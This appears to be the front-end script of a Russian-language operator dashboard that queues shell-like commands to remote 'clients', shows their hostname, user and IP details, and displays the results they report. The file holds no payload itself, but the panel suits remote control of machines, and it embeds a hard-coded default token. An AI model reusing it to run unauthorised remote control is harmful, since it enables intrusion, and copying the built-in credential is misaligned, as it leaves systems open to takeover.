const DEFAULT_TOKEN = "a9K2xP8mZ7QwL1vB";
const REFRESH_INTERVAL_MS = 5000;

const tokenInput = document.getElementById("token");
const refreshButton = document.getElementById("refresh-button");
const statusNode = document.getElementById("status");
const clientsCountNode = document.getElementById("clients-count");
const archivedBadgeNode = document.getElementById("archived-badge");
const totalCountNode = document.getElementById("total-count");
const onlineCountNode = document.getElementById("online-count");
const activeCountNode = document.getElementById("active-count");
const archivedCountNode = document.getElementById("archived-count");
const clientsListNode = document.getElementById("clients-list");
const archivedListNode = document.getElementById("archived-list");
const reportsListNode = document.getElementById("reports-list");
const commandForm = document.getElementById("command-form");
const clientIdInput = document.getElementById("client-id");
const commandInput = document.getElementById("command");

function setStatus(message, isError = false) {
  statusNode.textContent = message;
  statusNode.dataset.error = isError ? "true" : "false";
}

function escapeHtml(value) {
  return String(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}

function formatDate(value) {
  if (!value) {
    return "—";
  }

  const date = new Date(value);
  if (Number.isNaN(date.getTime())) {
    return value;
  }

  return date.toLocaleString();
}

function readToken() {
  const token = tokenInput.value.trim() || DEFAULT_TOKEN;
  localStorage.setItem("dashboard_token", token);
  return token;
}

async function postJson(url, payload) {
  const response = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(payload)
  });
  const result = await response.json();

  if (!response.ok) {
    throw new Error(result.error || "Request failed");
  }

  return result;
}

async function loadDashboard() {
  const token = readToken();
  setStatus("Загрузка данных...");

  try {
    const response = await fetch(`/api/dashboard?token=${encodeURIComponent(token)}`);
    const payload = await response.json();

    if (!response.ok) {
      throw new Error(payload.error || "Не удалось загрузить панель");
    }

    renderDashboard(payload);
    setStatus(`Данные обновлены: ${new Date().toLocaleTimeString()}`);
  } catch (error) {
    setStatus(error.message, true);
  }
}

function renderDashboard(payload) {
  const clients = payload.clients || [];
  const activeClients = clients.filter((client) => !client.archived);
  const archivedClients = clients.filter((client) => client.archived);

  renderClients(activeClients, clientsListNode, "Активных клиентов пока нет.");
  renderClients(archivedClients, archivedListNode, "В архиве пока ничего нет.");
  renderReports(payload.reports || []);

  clientsCountNode.textContent = String(activeClients.length);
  archivedBadgeNode.textContent = String(archivedClients.length);
  totalCountNode.textContent = String(payload.total_clients || 0);
  onlineCountNode.textContent = String(payload.online_clients || 0);
  activeCountNode.textContent = String(payload.active_clients || 0);
  archivedCountNode.textContent = String(payload.archived_clients || 0);
}

function buildClientCard(client) {
  const queue = client.queued_commands || [];
  const queueHtml = queue.length
    ? queue
        .map(
          (item) =>
            `<li><code>${escapeHtml(item.command)}</code><span>${formatDate(item.created_at)}</span></li>`
        )
        .join("")
    : "<li>Очередь пуста</li>";

  const latestReport = client.latest_report
    ? `<pre>${escapeHtml(client.latest_report.result)}</pre>`
    : "<p class=\"muted\">Отчетов пока нет</p>";

  return `
    <section class="card ${client.is_online ? "card-online" : "card-offline"}">
      <div class="card-header">
        <div>
          <div class="title-row">
            <h3>${escapeHtml(client.display_name)}</h3>
            <span class="status-pill ${client.is_online ? "online" : "offline"}">
              ${client.is_online ? "online" : "offline"}
            </span>
            ${client.archived ? "<span class=\"status-pill archived\">archived</span>" : ""}
          </div>
          <p class="muted mono">${escapeHtml(client.client_id)}</p>
        </div>
        <button type="button" class="small-button" data-select-client="${escapeHtml(client.client_id)}">
          Выбрать
        </button>
      </div>
      <div class="client-meta">
        <p>Регистрация: ${formatDate(client.registered_at)}</p>
        <p>Последний контакт: ${formatDate(client.last_seen_at)}</p>
        <p>Команд в очереди: ${client.pending_commands}</p>
      </div>
      <div class="subsection">
        <strong>System info</strong>
        <div class="info-grid">
          <p><span>Host:</span> ${escapeHtml(client.system_info?.hostname || "—")}</p>
          <p><span>User:</span> ${escapeHtml(client.system_info?.username || "—")}</p>
          <p><span>OS:</span> ${escapeHtml(client.system_info?.os || "—")}</p>
          <p><span>IP:</span> ${escapeHtml(client.system_info?.local_ips || "—")}</p>
          <p><span>Client:</span> ${escapeHtml(client.system_info?.client_version || "—")}</p>
          <p><span>Python:</span> ${escapeHtml(client.system_info?.python_version || "—")}</p>
        </div>
      </div>
      <form class="rename-form" data-rename-form="${escapeHtml(client.client_id)}">
        <input
          type="text"
          name="name"
          value="${escapeHtml(client.name || "")}"
          placeholder="Новое имя клиента"
        />
        <button type="submit" class="small-button">Сохранить имя</button>
      </form>
      <div class="actions-row">
        <button type="button" class="small-button" data-restart-client="${escapeHtml(client.client_id)}">
          Restart
        </button>
        <button
          type="button"
          class="small-button secondary-button"
          data-archive-client="${escapeHtml(client.client_id)}"
          data-archived-state="${client.archived ? "true" : "false"}"
        >
          ${client.archived ? "Вернуть" : "В архив"}
        </button>
        <button
          type="button"
          class="small-button danger-button"
          data-delete-client="${escapeHtml(client.client_id)}"
        >
          Удалить
        </button>
      </div>
      <div class="subsection">
        <strong>Очередь</strong>
        <ul class="queue-list">${queueHtml}</ul>
      </div>
      <div class="subsection">
        <strong>Последний отчет</strong>
        ${latestReport}
      </div>
    </section>
  `;
}

function renderClients(clients, container, emptyText) {
  if (!clients.length) {
    container.className = "list empty";
    container.textContent = emptyText;
    return;
  }

  container.className = "list";
  container.innerHTML = clients.map(buildClientCard).join("");

  container.querySelectorAll("[data-select-client]").forEach((button) => {
    button.addEventListener("click", () => {
      clientIdInput.value = button.dataset.selectClient || "";
      clientIdInput.focus();
    });
  });

  container.querySelectorAll("[data-restart-client]").forEach((button) => {
    button.addEventListener("click", async () => {
      const clientId = button.dataset.restartClient || "";
      const token = readToken();

      setStatus(`Перезапуск клиента ${clientId}...`);
      try {
        await postJson("/restart-client", {
          client_id: clientId,
          token
        });
        setStatus(`Команда restart поставлена для ${clientId}.`);
        await loadDashboard();
      } catch (error) {
        setStatus(error.message, true);
      }
    });
  });

  container.querySelectorAll("[data-archive-client]").forEach((button) => {
    button.addEventListener("click", async () => {
      const clientId = button.dataset.archiveClient || "";
      const archived = button.dataset.archivedState === "true";
      const token = readToken();

      setStatus(`${archived ? "Возврат" : "Архивация"} клиента ${clientId}...`);
      try {
        await postJson("/archive-client", {
          client_id: clientId,
          token,
          archived: !archived
        });
        setStatus(archived ? "Клиент возвращен из архива." : "Клиент отправлен в архив.");
        await loadDashboard();
      } catch (error) {
        setStatus(error.message, true);
      }
    });
  });

  container.querySelectorAll("[data-delete-client]").forEach((button) => {
    button.addEventListener("click", async () => {
      const clientId = button.dataset.deleteClient || "";
      const token = readToken();

      if (!window.confirm(`Удалить клиента ${clientId} со всеми отчетами и очередью команд?`)) {
        return;
      }

      setStatus(`Удаление клиента ${clientId}...`);
      try {
        await postJson("/delete-client", {
          client_id: clientId,
          token
        });
        setStatus("Клиент удален.");
        await loadDashboard();
      } catch (error) {
        setStatus(error.message, true);
      }
    });
  });

  container.querySelectorAll("[data-rename-form]").forEach((form) => {
    form.addEventListener("submit", async (event) => {
      event.preventDefault();
      const clientId = form.dataset.renameForm || "";
      const token = readToken();
      const name = form.elements.name.value.trim();

      if (!name) {
        setStatus("Имя клиента не должно быть пустым.", true);
        return;
      }

      setStatus(`Переименование клиента ${clientId}...`);
      try {
        await postJson("/rename-client", {
          client_id: clientId,
          token,
          name
        });
        setStatus("Имя клиента сохранено.");
        await loadDashboard();
      } catch (error) {
        setStatus(error.message, true);
      }
    });
  });
}

function renderReports(reports) {
  if (!reports.length) {
    reportsListNode.className = "list empty";
    reportsListNode.textContent = "Отчетов пока нет.";
    return;
  }

  reportsListNode.className = "list";
  reportsListNode.innerHTML = reports
    .map(
      (report) => `
        <section class="card">
          <div class="card-header">
            <div>
              <h3>${escapeHtml(report.display_name || report.client_id)}</h3>
              <p class="muted mono">${escapeHtml(report.client_id)}</p>
            </div>
            <span>${formatDate(report.received_at)}</span>
          </div>
          <pre>${escapeHtml(report.result)}</pre>
        </section>
      `
    )
    .join("");
}

async function submitCommand(event) {
  event.preventDefault();
  const token = readToken();
  const clientId = clientIdInput.value.trim();
  const command = commandInput.value.trim();

  if (!clientId || !command) {
    setStatus("Нужно указать client_id и команду.", true);
    return;
  }

  setStatus("Команда отправляется...");

  try {
    await postJson("/add-command", {
      client_id: clientId,
      token,
      command
    });
    commandInput.value = "";
    setStatus("Команда добавлена в очередь.");
    await loadDashboard();
  } catch (error) {
    setStatus(error.message, true);
  }
}

function initialize() {
  const savedToken = localStorage.getItem("dashboard_token");
  if (savedToken) {
    tokenInput.value = savedToken;
  }

  refreshButton.addEventListener("click", loadDashboard);
  commandForm.addEventListener("submit", submitCommand);

  loadDashboard();
  window.setInterval(loadDashboard, REFRESH_INTERVAL_MS);
}

initialize();
